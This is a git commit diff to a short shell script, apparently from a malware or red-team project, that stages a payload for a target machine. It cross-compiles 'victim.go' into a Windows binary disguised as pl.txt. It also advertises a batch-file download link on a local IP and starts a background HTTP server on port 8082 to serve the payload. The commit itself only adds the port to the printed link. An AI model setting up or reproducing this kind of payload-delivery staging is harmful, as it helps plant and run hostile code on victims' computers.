7aa04a507938b68a5194e756b0bad5458713bd76
Khang Truong <113339215+Khang2910@users.noreply.github.com>
2025-07-24 23:03:49 +0700

    Update prepare.sh

--- prepare.sh
+++ prepare.sh
@@ -1,4 +1,4 @@
 GOOS=windows GOARCH=amd64 go build -o serving/pl.txt victim.go
-echo "Public link: http:/192.168.2.135/content.bat"
+echo "Public link: http:/192.168.2.135:8082/content.bat"
 cd serving
 sudo nohup python3 -m http.server 8082 > log.txt 2>&1 &
